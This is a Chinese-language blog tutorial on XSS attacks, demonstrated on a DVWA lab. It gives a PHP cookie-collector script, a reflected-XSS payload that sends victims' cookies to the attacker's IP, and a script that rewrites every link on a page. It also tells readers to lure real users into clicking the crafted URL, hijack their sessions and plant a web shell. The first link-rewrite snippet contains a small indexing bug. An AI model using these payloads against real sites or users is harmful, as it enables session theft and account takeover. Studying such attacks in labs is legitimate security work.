---
title: XSS 漏洞的攻击手法
comments: true
toc: true
tags:
    - XSS
description: 介绍 XSS 可以实现的攻击其中包括：Cookie 劫持与篡改网页链接等
categies:
    - websec
    - xss
date: 2019-08-15 17:45:11
---

# Cookie 劫持

## 原理

首先，我们有个服务器，当然，这里我在自己电脑上用 php study 搭建一个服务器

其次，我们需要有个脚本来获取用户的 cookie，写入到我们电脑上。

下面我们写一个脚本：cookie.php

```php
<?php
if(isset($_GET['cookie']))
{
	$cookie=$_GET['cookie'];
	file_put_contents('cookie.txt',$cookie);
}
?>
```

将其放到 PHP Study 的 WWW 目录下的 xss_test 目录下。

然后，我们通过浏览器对象中的 Location 对象来改变当前的 URL，将当前 cookie 提交到我们指定的 URL 的脚本文件，这样我们可以在脚本文件中将 cookie 保留下来。

注：

**Document.location** 是一个只读属性，返回一个 [`Location`](https://developer.mozilla.org/zh-CN/docs/Web/API/Location) 对象，包含有文档的 URL 相关的信息，并提供了改变该 URL 和加载其他 URL 的方法。

## 测试

下面我访问虚拟机的 dvwa 的反射 XSS，并使用 hackbar 将构造的下列 paylaod 进行 URL 编码（注：GET 方式的 payload 不能直接写到地址栏，要经过 URL 编码）

```php
<script>document.location='http://你的主机ip/xss_test/cookie.php?cookie='+document.cookie</script>
```

其中，“你的主机 ip” 写你主机的 ip，这样

```php
http://192.168.107.156/dvwa-master/vulnerabilities/xss_r/?name=%3Cscript%3Edocument.location%3D'http%3A%2F%2F113.54.198.24%2Fxss_test%2Fcookie.php%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E
```

然后，我们就可以发给别人，先让他们登录对应网站，然后诱使其点击该 URL，这样我们就可以获取其 cookie 了。

注意：高版本的 phpstudy（没准是 php 版本 或 apache 版本高？）默认增加 usertoken，测试会不正常。

这样我们使用通过修改浏览器 cookie 或使用 burp 截获并修改 cookie 来实现会话劫持。

劫持会话后的操作

1. 查看信息，修改配置
2. 寻找其他漏洞点，比如：寻找文件上传漏洞，上传一句话。

# 篡改网页链接

## 原理

window.onload 当窗口加载时，执行匿名函数

使用 for 循环遍历所有获得的链接的 a 标签

```php+HTML
<script>
window.onload = function()
{
	var links=document.getElementsByTagName("a");
	for(var i =0; i < links.length;i++)
		links.href="www.baidu.com";
}
</script>
```

## 测试

将篡改代码注入到对应的 XSS 位置，以 DVWA 反射型 XSS 为例，我们在输入框中输入上面的代码，然后使用检查元素方式，便可以查看修改后的链接。

```php
http://192.168.107.156/dvwa-master/vulnerabilities/xss_r/?name=%3Cscript%3E%0Awindow.onload%20%3D%20function()%0A%7B%0A%09var%20links%3Ddocument.getElementsByTagName(%22a%22)%3B%0A%09for(var%20i%20%3D%200%3B%20i%20%3C%20links.length%3Bi%2B%2B)%0A%09%09links%5Bi%5D.href%3D%22https%3A%2F%2Fwww.baidu.com%22%3B%0A%7D%0A%3C%2Fscript%3E
```

注入后，网页链接变都会改变为你重定向的网页连接，这样就达到了篡改网页链接的目的，当然，反射型只是一时的，存储型 XSS 对篡改网页链接持久有效。

未完待续...
